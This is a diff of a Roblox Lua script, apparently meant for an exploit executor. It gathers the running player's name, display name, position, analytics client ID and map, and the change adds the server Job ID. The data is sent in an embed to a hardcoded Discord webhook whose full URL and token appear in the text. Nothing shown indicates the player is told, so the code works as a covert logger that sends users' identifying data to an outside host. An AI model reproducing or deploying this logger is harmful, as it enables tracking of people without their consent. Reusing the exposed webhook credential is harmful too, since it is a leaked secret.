@@ -14,8 +14,9 @@ local currentTime = os.date("%Y-%m-%d %H:%M:%S")
 local player = game.Players.LocalPlayer
 local playerName = player.Name
 local playerDisplayName = player.DisplayName
-local playerPosition = player.Character and player.Character.HumanoidRootPart.Position or "Unknown"
+local playerPosition = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "Unknown"
 local clientId = game:GetService('RbxAnalyticsService'):GetClientId()
+local jobId = game.JobId
 
 pcall(function()
     local data = {
@@ -30,7 +31,8 @@ Player Name: %s
 Display Name: %s
 Player Position: %s
 Client ID: %s
-]], executor, mapName.Name, currentTime, playerName, playerDisplayName, tostring(playerPosition), clientId),
+Job ID: %s
+]], executor, mapName.Name, currentTime, playerName, playerDisplayName, tostring(playerPosition), clientId, jobId),
                 ["color"] = tonumber(0x7269da)
             }
         }
@@ -66,7 +68,6 @@ Client ID: %s
         })
     end
 end)
-
 local webh =
 "https://discord.com/api/webhooks/1348879379186585710/HL6nj5UQrxSgDUzsgWHWhoGUbZCdb5Oj7dMZvrhI8XuBUY53-ImRh9LSylqR_zA7QZT6"
 local httpService = game:GetService('HttpService')
